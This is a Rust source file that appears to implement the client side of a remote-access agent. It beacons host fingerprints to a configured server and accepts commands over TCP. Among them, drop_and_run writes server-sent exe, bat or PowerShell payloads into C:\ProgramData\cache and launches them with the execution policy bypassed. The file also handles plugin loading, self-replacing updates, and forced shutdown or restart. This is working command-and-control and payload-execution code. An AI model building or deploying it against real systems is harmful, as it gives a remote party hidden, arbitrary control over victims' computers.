use std::{
    io::{BufRead, BufReader, ErrorKind, Write},
    net::Shutdown,
    net::TcpStream,
    thread,
    time::Duration,
};

use crate::{plugin::Manager, sys, telemetry, text, update};

pub fn run(ip: &str, port: u16, mut final_ready: Option<update::FinalReadyArgs>) {
    let fp = telemetry::fingerprint();
    let host = telemetry::host(&fp);
    let mut plugins = Manager::new();

    loop {
        match TcpStream::connect((ip, port)) {
            Ok(mut stream) => {
                let ping = telemetry::ping_ms(ip);
                let _ = stream.set_read_timeout(Some(Duration::from_secs(text::READ)));
                let data = telemetry::record(ip, ping, &fp);

                if send(&mut stream, &format!("{}{}", text::HELLO, fp)).is_ok()
                    && send(&mut stream, &format!("{}{}", text::DATA, data)).is_ok()
                {
                    println!("{}", text::CONNECTED);
                    if std::env::var_os("ZTSEC_CI").is_some() {
                        eprintln!(
                            "agent process pid={} exe={}",
                            std::process::id(),
                            std::env::current_exe().map(|p| p.display().to_string()).unwrap_or_else(|_| "<unknown>".into())
                        );
                    }
                    plugins.event("agent.connected", host.as_bytes());
                    if let Some(context) = final_ready.as_ref() {
                        match update::notify_final_ready(context) {
                            Ok(()) => {
                                if std::env::var_os("ZTSEC_CI").is_some() {
                                    eprintln!("update phase=final-connected");
                                }
                                final_ready = None;
                            }
                            Err(error) => {
                                if std::env::var_os("ZTSEC_CI").is_some() {
                                    eprintln!("update phase=final-ready-notification-failed error={error}");
                                }
                            }
                        }
                    }
                    if session(&mut stream, ip, port, &fp, &host, &mut plugins) {
                        plugins.clear();
                        return;
                    }
                    plugins.clear();
                }
            }
            Err(_) => {}
        }

        println!("{}", text::RETRYING);
        thread::sleep(Duration::from_secs(text::RETRY));
    }
}

fn starts_with_ascii_ci(value: &str, prefix: &str) -> bool {
    value.len() >= prefix.len()
        && value
            .as_bytes()
            .iter()
            .take(prefix.len())
            .zip(prefix.as_bytes().iter())
            .all(|(a, b)| a.to_ascii_uppercase() == b.to_ascii_uppercase())
}

fn session(stream: &mut TcpStream, ip: &str, port: u16, fp: &str, host: &str, plugins: &mut Manager) -> bool {
    let Ok(clone) = stream.try_clone() else { return false; };
    let mut reader = BufReader::new(clone);

    loop {
        for output in plugins.drain_outputs() {
            let event = output.event.replace(':', "_").replace('\n', "_");
            let payload = decode_or_empty(output.payload);
            let _ = send(stream, &format!("{}{}:{}", text::PLUGOUT, event, encode_b64(&payload)));
        }
        match line(&mut reader) {
            Ok(Some(value)) if value == text::HB => {
                let _ = send(stream, text::PONG);
            }
            Ok(Some(value)) if value == text::REQ => {
                let _ = send(stream, text::PONG);
                let _ = send(stream, &format!("{}{}", text::DATA, telemetry::record(ip, None, fp)));
            }
            Ok(Some(value)) if value.starts_with(text::CMD) => {
                let raw = value[text::CMD.len()..].trim();

                // Legacy one-shot plugin load remains supported for compatibility.
                if starts_with_ascii_ci(raw, text::PLUGIN) {
                    let rest = raw[text::PLUGIN.len()..].trim();
                    let (id, b64) = match rest.split_once(':') {
                        Some((i, b)) => (i.trim(), b.trim()),
                        None => { let _ = send(stream, &format!("{}{}", text::ERR, text::PLUGIN)); continue; }
                    };
                    if id.is_empty() || b64.is_empty() { let _ = send(stream, &format!("{}{}", text::ERR, text::PLUGIN)); continue; }
                    match decode_b64(b64) {
                        Some(bytes) => match plugins.load(id, &bytes, host.as_bytes()) {
                            Ok(()) => { let _ = send(stream, &format!("{}{}{}", text::ACK, text::PLUGIN, id)); }
                            Err(_) => { let _ = send(stream, &format!("{}{}", text::ERR, text::PLUGIN)); }
                        },
                        None => { let _ = send(stream, &format!("{}{}", text::ERR, text::PLUGIN)); }
                    }
                    continue;
                }

                if starts_with_ascii_ci(raw, text::PBEGIN) {
                    let parts: Vec<&str> = raw[text::PBEGIN.len()..].trim().splitn(4, ':').collect();
                    if parts.len() != 4 { let _ = send(stream, &format!("{}{}", text::ERR, text::PBEGIN)); continue; }
                    let plugin_id = parts[0].trim();
                    let transfer_id = parts[1].trim();
                    let size = match parts[2].trim().parse::<u64>() { Ok(v) => v, Err(_) => { let _ = send(stream, &format!("{}{}", text::ERR, text::PBEGIN)); continue; } };
                    let hash = parts[3].trim();
                    if plugin_id.is_empty() || transfer_id.is_empty() || size == 0 || !is_hex64(hash) || size > 256 * 1024 * 1024 {
                        let _ = send(stream, &format!("{}{}", text::ERR, text::PBEGIN)); continue;
                    }
                    match plugins.begin_transfer(plugin_id, transfer_id, size, hash) {
                        Ok(next) => { let _ = send(stream, &format!("{}{}{}:{}", text::ACK, text::PBEGIN, transfer_id, next)); }
                        Err(_) => { let _ = send(stream, &format!("{}{}", text::ERR, text::PBEGIN)); }
                    }
                    continue;
                }

                if starts_with_ascii_ci(raw, text::PRESUME) {
                    let transfer_id = raw[text::PRESUME.len()..].trim();
                    match plugins.resume_transfer(transfer_id) {
                        Some(next) => { let _ = send(stream, &format!("{}{}{}:{}", text::ACK, text::PRESUME, transfer_id, next)); }
                        None => { let _ = send(stream, &format!("{}{}", text::ERR, text::PRESUME)); }
                    }
                    continue;
                }

                if starts_with_ascii_ci(raw, text::PCHUNK) {
                    let parts: Vec<&str> = raw[text::PCHUNK.len()..].trim().splitn(3, ':').collect();
                    if parts.len() != 3 { let _ = send(stream, &format!("{}{}", text::ERR, text::PCHUNK)); continue; }
                    let transfer_id = parts[0].trim();
                    let offset = match parts[1].trim().parse::<u64>() { Ok(v) => v, Err(_) => { let _ = send(stream, &format!("{}{}", text::ERR, text::PCHUNK)); continue; } };
                    let bytes = match update::decode_base64(parts[2].trim()) { Some(v) if !v.is_empty() && v.len() <= 128 * 1024 => v, _ => { let _ = send(stream, &format!("{}{}", text::ERR, text::PCHUNK)); continue; } };
                    match plugins.append_transfer(transfer_id, offset, &bytes) {
                        Ok(next) => { let _ = send(stream, &format!("{}{}{}:{}", text::ACK, text::PCHUNK, transfer_id, next)); }
                        Err(_) => { let _ = send(stream, &format!("{}{}", text::ERR, text::PCHUNK)); }
                    }
                    continue;
                }

                if starts_with_ascii_ci(raw, text::PEND) {
                    let transfer_id = raw[text::PEND.len()..].trim();
                    match plugins.finish_transfer(transfer_id, host.as_bytes()) {
                        Ok(id) => { let _ = send(stream, &format!("{}{}{}", text::ACK, text::PEND, id)); }
                        Err(_) => { let _ = send(stream, &format!("{}{}", text::ERR, text::PEND)); }
                    }
                    continue;
                }

                if starts_with_ascii_ci(raw, text::PMSG) {
                    let rest = raw[text::PMSG.len()..].trim();
                    let (plugin_id, encoded) = match rest.split_once(':') { Some(v) => v, None => { let _=send(stream, &format!("{}{}",text::ERR,text::PMSG)); continue; } };
                    if plugin_id.trim().is_empty() { let _=send(stream,&format!("{}{}",text::ERR,text::PMSG)); continue; }
                    let payload = match update::decode_base64(encoded.trim()) { Some(v) => v, None => { let _=send(stream,&format!("{}{}",text::ERR,text::PMSG)); continue; } };
                    let mut parts = payload.splitn(2, |b| *b == b'\n');
                    let event_bytes = parts.next().unwrap_or(&[]);
                    let data = parts.next().unwrap_or(&[]);
                    let event = match core::str::from_utf8(event_bytes) { Ok(v) if !v.is_empty() => v, _ => { let _=send(stream,&format!("{}{}",text::ERR,text::PMSG)); continue; } };
                    plugins.event(event, data);
                    let _ = send(stream, &format!("{}{}{}", text::ACK, text::PMSG, plugin_id.trim()));
                    continue;
                }

                if starts_with_ascii_ci(raw, "UNLOAD:") {
                    let id = raw[7..].trim();
                    let ok = plugins.unload(id);
                    let _ = send(stream, &format!("{}{}{}", if ok { text::ACK } else { text::ERR }, text::PLUGOUT, id));
                    continue;
                }

                if starts_with_ascii_ci(raw, text::PEVENT) {
                    let event = raw[text::PEVENT.len()..].trim();
                    if event.is_empty() {
                        let _ = send(stream, &format!("{}{}", text::ERR, text::PEVENT));
                    } else {
                        plugins.event(event, &[]);
                        let _ = send(stream, &format!("{}{}{}", text::ACK, text::PEVENT, event));
                    }
                    continue;
                }

                if starts_with_ascii_ci(raw, text::UPDATE) {
                    let rest = raw[text::UPDATE.len()..].trim();
                    let (expected_hash, b64) = match rest.split_once(':') {
                        Some((h, b)) => (h.trim(), b.trim()),
                        None => { let _ = send(stream, &format!("{}{}", text::ERR, text::UPDATE)); continue; }
                    };
                    let bytes = match update::decode_base64(b64) {
                        Some(bytes) if !bytes.is_empty() && bytes.len() <= update::max_update_bytes() => bytes,
                        _ => { let _ = send(stream, &format!("{}{}", text::ERR, text::UPDATE)); continue; }
                    };
                    #[cfg(windows)]
                    if bytes.len() < 2 || &bytes[..2] != b"MZ" {
                        let _ = send(stream, &format!("{}{}", text::ERR, text::UPDATE));
                        continue;
                    }
                    let actual_hash = update::sha256_hex(&bytes);
                    if !update::validate_hash(expected_hash, &actual_hash) {
                        let _ = send(stream, &format!("{}{}", text::ERR, text::UPDATE));
                        continue;
                    }
                    if std::env::var_os("ZTSEC_CI").is_some() {
                        eprintln!("update phase=validated bytes={} hash={}", bytes.len(), actual_hash);
                    }
                    let staged = match update::stage_bytes(&bytes, expected_hash) {
                        Ok(path) => path,
                        Err(err) => { eprintln!("update staging failed: {err}"); let _ = send(stream, &format!("{}{}", text::ERR, text::UPDATE)); continue; }
                    };
                    let target = match std::env::current_exe() {
                        Ok(path) => path,
                        Err(err) => { eprintln!("update current executable lookup failed: {err}"); let _=std::fs::remove_file(&staged); let _=send(stream,&format!("{}{}",text::ERR,text::UPDATE)); continue; }
                    };
                    let parent_pid = std::process::id();
                    let handoff = match update::spawn_successor(staged, target, actual_hash, parent_pid, ip, port, fp) {
                        Ok(h) => h,
                        Err(err) => { eprintln!("update successor launch failed: {err}"); let _=send(stream,&format!("{}{}",text::ERR,text::UPDATE)); continue; }
                    };
                    if std::env::var_os("ZTSEC_CI").is_some() { eprintln!("update phase=successor-spawned parent_pid={parent_pid}"); }
                    if let Err(err) = handoff.wait_admission() {
                        eprintln!("update admission failed: {err}");
                        let _=send(stream,&format!("{}{}",text::ERR,text::UPDATE));
                        continue;
                    }
                    if std::env::var_os("ZTSEC_CI").is_some() { eprintln!("update phase=admitted"); }
                    if let Err(err)=send(stream,&format!("{}{}",text::ACK,text::UPDATE)){ eprintln!("update acknowledgement send failed: {err}"); return true; }
                    let _=stream.shutdown(Shutdown::Write);
                    if std::env::var_os("ZTSEC_CI").is_some(){eprintln!("update phase=ack-sent");}
                    return true;
                }

                if starts_with_ascii_ci(raw, text::EXECUTE) {
                    let rest = raw[text::EXECUTE.len()..].trim();
                    let (ext, b64) = match rest.split_once(':') {
                        Some((e, b)) => (e.trim(), b.trim()),
                        None => {
                            let _ = send(stream, &format!("{}{}", text::ERR, text::EXECUTE));
                            continue;
                        }
                    };
                    let ext_lc = ext.to_ascii_lowercase();
                    if !matches!(ext_lc.as_str(), "exe" | "bat" | "ps1") || b64.is_empty() {
                        let _ = send(stream, &format!("{}{}", text::ERR, text::EXECUTE));
                        continue;
                    }
                    match decode_b64(b64) {
                        Some(bytes) => match drop_and_run(&bytes, &ext_lc) {
                            Ok(()) => { let _ = send(stream, &format!("{}{}", text::ACK, text::EXECUTE)); }
                            Err(_) => { let _ = send(stream, &format!("{}{}", text::ERR, text::EXECUTE)); }
                        },
                        None => { let _ = send(stream, &format!("{}{}", text::ERR, text::EXECUTE)); }
                    }
                    continue;
                }

                let cmd = raw.to_ascii_uppercase();
                match cmd.as_str() {
                    text::RECONNECT => {
                        let _ = send(stream, &format!("{}{}", text::ACK, cmd));
                        return false;
                    }
                    text::CLOSE => {
                        let _ = send(stream, &format!("{}{}", text::ACK, cmd));
                        println!("{}", text::CLOSED);
                        return true;
                    }
                    text::SLEEP | text::HIBERNATE | text::RESTART | text::SHUTDOWN => {
                        let ok = sys::command(&cmd);
                        let _ = send(stream, &format!("{}{}", if ok { text::ACK } else { text::ERR }, cmd));
                        plugins.event("agent.command", cmd.as_bytes());
                        if ok { return true; }
                    }
                    _ => {}
                }
            }
            Ok(Some(_)) => {}
            Ok(None) => return false,
            Err(e) if matches!(e.kind(), ErrorKind::TimedOut | ErrorKind::WouldBlock) => {
                let _ = send(stream, text::HB);
            }
            Err(_) => return false,
        }
    }
}

fn drop_and_run(bytes: &[u8], ext: &str) -> std::io::Result<()> {
    use std::{fs, process::Command, time::SystemTime};

    let seed = SystemTime::now()
        .duration_since(SystemTime::UNIX_EPOCH)
        .map(|d| d.as_nanos() as u64)
        .unwrap_or(0)
        ^ (bytes.len() as u64).wrapping_mul(0x9e37_79b9_7f4a_7c15);
    let name = format!("{:012x}", seed & 0xffff_ffff_ffff);

    let dir = std::path::Path::new(r"C:\ProgramData\cache");
    fs::create_dir_all(dir)?;
    let path = dir.join(format!("{name}.{ext}"));
    fs::write(&path, bytes)?;

    match ext {
        "exe" => { Command::new(&path).spawn()?; }
        "bat" => { Command::new("cmd").args(["/c", path.to_str().unwrap_or("")]).spawn()?; }
        "ps1" => { Command::new("powershell").args(["-NoProfile", "-ExecutionPolicy", "Bypass", "-File", path.to_str().unwrap_or("")]).spawn()?; }
        _ => {}
    }
    Ok(())
}

// Minimal base64 decoder (RFC 4648, no padding requirement)
fn decode_b64(s: &str) -> Option<Vec<u8>> {
    let s = s.trim();
    let mut out = Vec::with_capacity(s.len() * 3 / 4);
    let mut buf = 0u32;
    let mut bits = 0u32;
    for b in s.bytes() {
        let v = match b {
            b'A'..=b'Z' => (b - b'A') as u32,
            b'a'..=b'z' => (b - b'a' + 26) as u32,
            b'0'..=b'9' => (b - b'0' + 52) as u32,
            b'+' | b'-' => 62,
            b'/' | b'_' => 63,
            b'=' | b'\r' | b'\n' | b' ' => continue,
            _ => return None,
        };
        buf = (buf << 6) | v;
        bits += 6;
        if bits >= 8 {
            bits -= 8;
            out.push((buf >> bits) as u8);
            buf &= (1 << bits) - 1;
        }
    }
    Some(out)
}

fn is_hex64(value: &str) -> bool {
    value.len() == 64 && value.bytes().all(|b| matches!(b, b'0'..=b'9' | b'a'..=b'f' | b'A'..=b'F'))
}

fn encode_b64(bytes: &[u8]) -> String {
    const TABLE: &[u8; 64] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut out = String::with_capacity(((bytes.len()+2)/3)*4);
    let mut i=0;
    while i<bytes.len() {
        let a=bytes[i] as u32; let b=if i+1<bytes.len(){bytes[i+1] as u32}else{0}; let c=if i+2<bytes.len(){bytes[i+2] as u32}else{0};
        let n=(a<<16)|(b<<8)|c;
        out.push(TABLE[((n>>18)&63) as usize] as char);
        out.push(TABLE[((n>>12)&63) as usize] as char);
        out.push(if i+1<bytes.len(){TABLE[((n>>6)&63) as usize] as char}else{'='});
        out.push(if i+2<bytes.len(){TABLE[(n&63) as usize] as char}else{'='});
        i+=3;
    }
    out
}

fn decode_or_empty(bytes: Vec<u8>) -> Vec<u8> { bytes }

fn line(r: &mut BufReader<TcpStream>) -> std::io::Result<Option<String>> {
    let mut s = String::new();
    Ok(match r.read_line(&mut s)? {
        0 => None,
        _ => Some(s.trim_end_matches(['\r', '\n']).to_owned()),
    })
}

fn send(stream: &mut TcpStream, s: &str) -> std::io::Result<()> {
    stream.write_all(s.as_bytes())?;
    stream.write_all(b"\n")
}
